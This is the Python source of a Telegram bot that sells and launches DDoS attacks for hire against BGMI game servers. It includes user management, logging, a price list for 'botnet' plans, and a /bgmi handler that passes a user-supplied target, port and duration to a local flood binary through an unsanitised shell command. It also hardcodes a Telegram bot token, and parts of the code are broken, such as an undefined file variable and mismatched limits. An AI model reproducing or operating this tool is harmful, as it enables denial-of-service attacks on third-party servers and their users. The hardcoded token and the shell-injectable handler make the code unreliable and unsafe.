#!/usr/bin/python3
#By Indian Watchdogs @Indian_Hackers_Team

import telebot
import subprocess
import requests
import datetime
import os

# insert your Telegram bot token here
bot = telebot.TeleBot('7209620036:AAEN86O0wB3dJxZwhUxne8uJckA--UG_ywM')

# Admin user IDs
admin_id = ["6920580865"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"


# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass


# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@SENATOR_GMING" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")


# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found."
            else:
                file.truncate(0)
                response = "Logs cleared successfully"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                response = f"User {user_to_add} Added Successfully."
            else:
                response = "User already exists."
        else:
            response = "Please specify a user ID to add."
    else:
        response = "Only Admin Can Run This Command."

    bot.reply_to(message, response)



@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} removed successfully."
            else:
                response = f"User {user_to_remove} not found in the list."
        else:
            response = '''Please Specify A User ID to Remove. 
 Usage: /remove <userid>'''
    else:
        response = "Only Admin Can Run This Command."

    bot.reply_to(message, response)


@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found."
                else:
                    file.truncate(0)
                    response = "Logs Cleared Successfully"
        except FileNotFoundError:
            response = "Logs are already cleared."
    else:
        response = "Only Admin Can Run This Command."
    bot.reply_to(message, response)

 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found"
        except FileNotFoundError:
            response = "No data found"
    else:
        response = "Only Admin Can Run This Command."
    bot.reply_to(message, response)


@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found."
                bot.reply_to(message, response)
        else:
            response = "No data found"
            bot.reply_to(message, response)
    else:
        response = "Only Admin Can Run This Command."
        bot.reply_to(message, response)


@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"Your ID: {user_id}"
    bot.reply_to(message, response)

# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI\nBy            @𝚂𝙴𝙽𝙰𝚃𝙾𝚁_𝙶𝙼𝙸𝙽𝙶"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =0

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 180:
                response = "You Are On Cooldown. Please Wait 3min Before Running The /bgmi Command Again."
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert time to integer
            time = int(command[3])  # Convert port to integer
            if time > 5000:
                response = "Error: Time interval must be less than 80."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./bgmi {target} {port} {time} 500"
                subprocess.run(full_command, shell=True)
                response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
        else:
            response = "Usage :- /bgmi <target> <port> <time>\n  @𝚂𝙴𝙽𝙰𝚃𝙾𝚁_𝙶𝙼𝙸𝙽𝙶"  # Updated command syntax
    else:
        response = "You Are Not Authorized To Use This Command.\n   @𝚂𝙴𝙽𝙰𝚃𝙾𝚁_𝙶𝙼𝙸𝙽𝙶"

    bot.reply_to(message, response)



# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "No Command Logs Found For You."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "You Are Not Authorized To Use This Command."

    bot.reply_to(message, response)


@bot.message_handler(commands=['help'])
def show_help(message):
    help_text = '''Available commands:
 /bgmi : Method For Bgmi Servers. 
 /rules : Please Check Before Use !!.
 /mylogs : To Check Your Recents Attacks.
 /plan : Checkout Our Botnet Rates.

 To See Admin Commands:
 /admincmd : Shows All Admin Commands.
  @𝚂𝙴𝙽𝙰𝚃𝙾𝚁_𝙶𝙼𝙸𝙽𝙶
'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f"Welcome to Your Home, {user_name}! Feel Free to Explore.\nTry To Run This Command : /help\n 𝚆𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 𝙲𝙷𝙴𝙰𝙿𝙴𝚂𝚃 𝙳𝙳𝙾𝚂 𝙰𝙽𝙳 𝙱𝙴𝚂𝚃 À𝙻𝚂𝙾 \n 𝚋𝚢 @𝚂𝙴𝙽𝙰𝚃𝙾𝚁_𝙶𝙼𝙸𝙽𝙶"
    bot.reply_to(message, response)


@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}𝙿𝙻𝙴𝙰𝚂𝙴 𝙵𝙾𝙻𝙻𝙾𝚆 𝚃𝙷𝙴𝚂𝙴 𝚁𝚄𝙻𝙴𝚂 

1. 𝙳𝙾𝙽𝚃 𝚁𝚄𝙽 𝚃𝙾𝙾 𝙼𝙰𝙽𝚈 𝙰𝚃𝚃𝙰𝙲𝙺𝚂 !! 𝙲𝙰𝚄𝚂𝙴 𝙰 𝙱𝙰𝙽 𝙵𝚁𝙾𝙼 𝙳𝙳𝙳𝙾𝚂 𝙱𝙾𝚃 
2. 𝙳𝙾𝙽𝚃 𝚁𝚄𝙽 2 À𝚃𝚃𝙰𝙲𝙺 𝙰𝚃 𝚂𝙰𝙼𝙴 𝚃𝙸𝙼𝙴 𝙱𝙲𝚉 𝙸𝙵 𝚄 𝙳𝙾 𝚄 𝙶𝙾𝚃 𝙱𝙰𝙽 𝙵𝚁𝙾𝙼 𝙱𝙾𝚃
3. 𝚆𝙴 𝙳𝙰𝙸𝙻𝚈 Ç𝙷𝙴Ç𝙺𝚂 𝚃𝙷𝙴 𝙻𝙾𝙶𝚂 𝚂𝙾 𝙵𝙾𝙻𝙻𝙾𝚆 𝚃𝙷𝙴𝚂𝙴 𝚁𝚄𝙻𝙴 (𝙽𝙷𝙸 𝚃𝙾 𝚃𝚄 𝙺𝙷𝚄𝙳 𝙱𝙰𝙽 𝙷𝙾𝙶𝙰 𝙼𝚄𝙹𝙷𝙴 𝙺𝚈𝙰)!!
 @𝚂𝙴𝙽𝙰𝚃𝙾𝚁_𝙶𝙼𝙸𝙽𝙶'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, 𝚂𝚄𝙽 𝙱𝙷𝙰𝙸 , 𝚈𝙽𝙷𝙰 𝚃𝚄𝙹𝙷𝙴 𝚂𝙰𝚂𝚃𝙸 𝙳𝙳𝙾𝚂 𝙼𝙸𝙻𝙴𝙶𝙰 𝙹𝙸𝚂𝙺𝙰 29𝚁𝚂 𝚂𝙷𝚄𝚁𝚄 𝙷𝙾𝚃𝙰 𝙷 𝚃𝙾 𝙰𝙰𝙺𝙴 𝚃𝚁𝚈 𝙺𝚁𝙾!:

S𝙴𝙽𝙰𝚃𝙾𝚁 𝙳𝙳𝙾𝚂 𝚅𝙸𝙿 𝙳𝙳𝙾𝚂 :
-> 𝙰𝚃𝚃𝙰𝙲𝙺 𝚃𝙸𝙼𝙴 : 200 (𝚂𝚎𝚌)
> 𝙰𝚃𝚃𝙰𝙲𝙺 𝚃𝙸𝙼𝙴 𝙻𝙸𝙼𝙸𝚃 : 2𝚖𝚒𝚗
-> 𝙲𝙾𝙽𝙲𝚄𝚁𝚁𝙴𝙽𝚃 𝙰𝚃𝚃𝙰𝙲𝙺 : 300

𝚂𝙴𝙽𝙰𝚃𝙾𝚁 𝙶𝙼𝙸𝙽𝙶 𝙿𝚁𝙸𝙲𝙴 𝙻𝙸𝚂𝚃 
𝙾𝙽𝙴 𝙼𝙰𝚃𝙲𝙷 --> 29Rs
𝚃𝚆𝙾 𝙼𝙰𝚃𝙲𝙷 --> 49Rs
1 𝙳𝙰𝚈 -->89 Rs
1 𝚆𝙴𝙴𝙺-->200 Rs
1 𝙼𝙾𝙽𝚃𝙷-->800 Rs
 @𝚂𝙴𝙽𝙰𝚃𝙾𝚁_𝙶𝙼𝙸𝙽𝙶
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Admin Commands Are Here!!:

/add <userId> : Add a User.
/remove <userid> Remove a User.
/allusers : Authorised Users Lists.
/logs : All Users Logs.
/broadcast : Broadcast a Message.
/clearlogs : Clear The Logs File.
@𝚂𝙴𝙽𝙰𝚃𝙾𝚁_𝙶𝙼𝙸𝙽𝙶
'''
    bot.reply_to(message, response)


@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "Message To All Users By Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users."
        else:
            response = "Please Provide A Message To Broadcast."
    else:
        response = "Only Admin Can Run This Command."

    bot.reply_to(message, response)




bot.polling()
#By Indian Watchdogs @Indian_Hackers_Team